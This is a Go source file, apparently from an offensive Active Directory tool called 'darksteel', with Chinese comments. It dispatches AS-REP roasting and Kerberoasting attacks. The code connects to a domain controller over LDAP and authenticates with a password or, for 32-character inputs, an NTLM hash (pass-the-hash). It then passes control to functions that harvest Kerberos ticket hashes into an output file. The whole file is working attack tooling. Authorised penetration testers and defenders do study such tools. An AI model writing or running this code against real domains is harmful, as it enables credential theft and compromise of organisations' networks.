package kerberos

import (
	"darksteel/process"
	"github.com/go-ldap/ldap/v3"
	"log"
)

var KosListDomain string

// 判断是否需要ldap辅助利用
func KerberosInit(domain string, target string, password string, user string, roastModule string, targetUser string, format string, enctype string, outputFile string, ldapSizeLimit int, ticket string) {
	var z **ldap.Conn
	switch {
	case roastModule == "asreproast" && targetUser != "":
		err := AsrepRoast(z, domain, target, targetUser, format, enctype, outputFile, ldapSizeLimit)
		if err != nil {
			return
		}
		break
	case roastModule == "asreproast" && targetUser == "":
		LdapCon(domain, target, password, user, roastModule, format, enctype, outputFile, ldapSizeLimit)
		break
	case roastModule == "kerberoast" && targetUser != "":
		err := Kerberoasting(z, domain, target, targetUser, enctype, outputFile, ldapSizeLimit, ticket, password, user)
		if err != nil {
			return
		}
		break
	case roastModule == "kerberoast" && targetUser == "":
		LdapCon(domain, target, password, user, roastModule, format, enctype, outputFile, ldapSizeLimit)
		break
	}
}

// 需要ldap查询的利用
func LdapCon(domain string, target string, password string, user string, roastModule string, format string, enctype string, outputFile string, ldapSizeLimit int) {
	KosListDomain = process.DcFormatConversion(domain)

	//连接
	l, err := ldap.DialURL("ldap://" + target + ":389")
	if err != nil {
		log.Fatal(err)
	}
	defer l.Close()

	//判断hash验证
	if len(password) != 32 {
		err = l.Bind(user, password)
		if err != nil {
			log.Fatal(err)
		}
	} else {
		err = l.NTLMBindWithHash(target, user, password)
		if err != nil {
			log.Fatalf("Failed to bind: %s\n", err)
		}
	}
	switch {
	case roastModule == "asreproast":
		err = AsrepRoast(&l, domain, target, "", format, enctype, outputFile, ldapSizeLimit)
		if err != nil {
			return
		}
		break
	case roastModule == "kerberoast":
		err = Kerberoasting(&l, domain, target, "", enctype, outputFile, ldapSizeLimit, "", password, user)
		if err != nil {
			return
		}
		break
	}
}
